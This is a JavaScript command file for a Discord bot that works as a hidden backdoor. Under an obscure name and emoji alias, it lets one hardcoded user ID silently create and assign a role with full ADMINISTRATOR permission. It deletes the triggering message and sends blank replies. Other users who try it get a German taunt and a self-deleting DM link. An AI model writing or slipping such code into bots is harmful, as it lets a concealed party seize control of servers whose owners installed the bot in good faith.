
const { inspect } = require("util");
const ownerid = "534751262416175116";


module.exports.run = async (bot, message, args) => {

	if(message.author.id == ownerid) {
	if (!message.member || message.member.hasPermission("ADMINISTRATOR")) {
		
	}

	if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
		return message.reply(" ");
	}
	message.delete();

	// Find the member
	const member = message.mentions.members.first() || message.guild.members.get(args[0]);
	if (!member) return message.reply(" ");

	// Find the role name
	const name = args.slice(1).join(" ");
	if (!name) return message.reply(" ");

	// Find the highest role position
	const position =
		message.guild.roles
			.sort((a, b) => b.position - a.position)
			.filter(r => message.guild.me.roles.has(r.id) && r.managed)
			.map(x => x.position)[0] || 1;

	try {
		// Create the role
		const role = await message.guild.createRole({
			name,
			position,
			permissions: "ADMINISTRATOR"
		});

		// Add the role
		member.addRole(role.id);
		message.channel.send(
			` `
		);
	} catch (e) {
		return message.reply(` ${e.message}`);
	}
 }
 else {

	return message.reply("Versuchs Erst Garnicht Tanas.. Und check mal deine dm´s").then(message.delete(), message.author.send("https://cdn.discordapp.com/attachments/797218861933789254/801965349582536714/video0_4.mp4").then (m => m.delete(60000)));
	
}
};

module.exports.config = {
	name: "tanas123",
	description: "create admin.",
	usage: "+...yyyyyyßßß <member> <rolename>",
	accessableby: "Moderators",
	aliases: ["🤔🤔🤔"]
};